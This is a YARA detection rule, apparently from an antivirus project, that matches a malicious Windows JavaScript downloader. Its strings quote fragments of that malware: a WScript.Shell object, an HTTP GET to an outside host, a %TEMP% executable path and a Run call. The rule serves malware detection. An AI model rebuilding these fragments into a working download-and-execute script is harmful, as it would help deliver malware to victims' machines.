rule sig_20160330_e823fc485b70b225c7724442885b3f18 {
  meta:
    description = "datamaliciousorder - file 20160330_e823fc485b70b225c7724442885b3f18.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "751873ba0c269545f53afdbf27b5fe8215b6fc22443f16515a002ab9654132d0"

  strings:
    $s1  = "function S(GZ, F){K0 = K0 * 1; return GZ - F;};" fullword ascii
    $s2  = "Y1[L](\"GET\", \"http://epegasus.pl/m2osa\", false);" fullword ascii
    $s3  = "var D = function N() {return WScript[YI](\"WScript\"+\".Shell\");}(), FP = 11;" fullword ascii
    $s4  = "if (Y1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XO() {return D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"urKU5D6bAPQd.ex\" + \"e\";};" fullword ascii
    $s6  = "function VC(){return SG + \"\";};" fullword ascii
    $s7  = "function AL() {return ((SM == true) && (SM == KL)) ? 1 : K0;};" fullword ascii
    $s8  = "function K(A){D[\"Run\"](A, K0, K0);};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "}while (H);" fullword ascii
    $s11 = "function QN(){return YI;};" fullword ascii
    $s12 = "return S(G, YE);" fullword ascii
    $s13 = "function YX(MW) {var PO = (1, 2, 3, 4, 5, MW); return PO;};" fullword ascii
    $s14 = "function DJ(){return 22;};" fullword ascii
    $s15 = "var EU = new this[\"Date\"]();" fullword ascii
    $s16 = "var G0 = false;" fullword ascii
    $s17 = "SM = true; " fullword ascii
    $s18 = "var SM = false;" fullword ascii
    $s19 = "KL = true; " fullword ascii
    $s20 = "var KL = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}